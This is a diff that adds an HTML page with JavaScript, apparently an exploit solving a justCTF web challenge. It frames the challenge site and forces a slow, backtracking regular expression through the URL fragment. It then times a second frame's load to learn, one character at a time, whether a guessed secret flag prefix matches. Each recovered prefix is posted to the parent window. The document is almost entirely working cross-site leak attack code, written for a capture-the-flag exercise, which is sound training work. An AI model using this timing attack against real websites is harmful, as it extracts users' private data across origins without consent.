@@ -1,0 +1,83 @@
+
+<body>
+
+</body>
+<script>
+    const chall_url = 'https://computeration-fixed.web.jctf.pro/';
+
+    // create the main frame that will be blocking the event loop when the flag
+    // was found
+    const iframe = document.createElement('iframe');
+    iframe.src = chall_url + '#';
+    
+    document.body.appendChild(iframe);
+
+    // get the flag prefix from a URL
+    const prefix = (new URL(location.href)).searchParams.get('flag') || 'justCTF{';
+
+    // define the alphabet for tha flag
+    const alphabet = 'abcdefghijklmnopqrstuvwxyz_}';
+
+    // when the main frame loads, start the script
+    iframe.onload = () => start(prefix);
+
+    // sleep function
+    const sleep = d => new Promise(r=>setTimeout(r,d));
+    
+    // dynamic frame used to measure the execution time of the main frame 
+    var iframe2;
+
+    // function used to check whether the prefix is apparent in admin's notes
+    async function checkPrefix(flag_prefix){
+        
+        // cause slow operation
+        iframe.src = chall_url + `#^(?=${flag_prefix}).*.*.*.*.*.*.*.*!!!!$`;
+
+        // wait for the frame to start executing regex
+        await sleep(50);
+        // try to load a same-site page to the main frame
+        iframe2 = document.createElement('iframe');
+        iframe2.src = chall_url;
+        document.body.appendChild(iframe2);
+        // measure the start time
+        let start = performance.now();
+        // only resolve when the iframe loads
+        return new Promise(resolve=>{
+            // when iframe loads, log the execution time, resolve the promise
+            // and remove the iframe
+            iframe2.onload = () => {
+                console.log(performance.now() - start);
+                resolve(1);
+                iframe2.remove();
+            }
+        })
+        
+    }
+
+    // function triggered on the document load
+    async function start(flag){
+        console.log(flag);
+        // for every letter in the alphabet, try to extended the flag with it
+        for(let c of alphabet){
+            // After 500 ms, remove the iframes, set the URL with the extended flag
+            // send a message to the parent about found prefix, and reload the document
+            // to restore the blocked thread
+            let trynew = setTimeout(async ()=>{
+                iframe.remove();
+                iframe2?.remove();
+                let url = new URL(location.href);
+                url.searchParams.set('flag', flag+c);
+                parent.postMessage(flag+c,'*');
+                await sleep(50);
+                location.replace(url.href);
+                return;
+            }, 500);
+
+            // try to find another letter, if it is fast enough (regext not match), the above setTimeout
+            // will be cleared, otherwise, it will trigger.
+            let res = await checkPrefix(flag+c);
+            clearTimeout(trynew);
+        }
+    }
+
+</script>
